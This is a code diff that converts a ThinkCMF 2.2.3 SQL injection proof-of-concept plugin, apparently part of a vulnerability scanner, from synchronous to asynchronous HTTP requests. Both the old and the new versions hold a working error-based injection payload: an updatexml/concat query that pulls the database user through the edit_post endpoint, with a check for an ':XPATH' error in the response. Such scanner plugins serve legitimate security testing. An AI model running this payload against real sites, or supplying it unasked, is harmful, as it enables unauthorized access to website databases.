@@ -2,6 +2,7 @@
 # -*- coding: utf-8 -*-
 # @author: 'orleven'
 
+from lib.utils.connect import ClientSession
 from script import Script, SERVICE_PORT_MAP
 
 class POC(Script):
@@ -15,17 +16,20 @@ class POC(Script):
         self.refer = 'https://xz.aliyun.com/t/3529'
         Script.__init__(self, target=target, service_type=self.service_type)
 
-    def prove(self):
-        self.get_url()
+    async def prove(self):
+        await self.get_url()
         if self.base_url:
             path_list = list(set([
                 self.url_normpath(self.base_url, '/'),
                 self.url_normpath(self.url, './'),
             ]))
-            for path in path_list:
-                url = path + "/index.php?g=Portal&m=Article&a=edit_post"
-                _data = 'term=123&post[post_title]=123&post[post_title]=aaa&post_title=123&post[id][0]=bind&post[id][1]=0 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))'
-                res = self.curl('post', url,data = _data)
-                if res != None and ':XPATH' in res.text:
-                    self.flag = 1
-                    self.req.append({"flag": url})
+            async with ClientSession() as session:
+                for path in path_list:
+                    url = path + "index.php?g=Portal&m=Article&a=edit_post"
+                    _data = 'term=123&post[post_title]=123&post[post_title]=aaa&post_title=123&post[id][0]=bind&post[id][1]=0 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))'
+                    async with session.post(url=url, data=_data) as res:
+                        if res != None:
+                            text = await res.text()
+                            if ':XPATH' in text:
+                                self.flag = 1
+                                self.res.append({"info": url, "key": "thinkcmf 2.2.3 sql"})
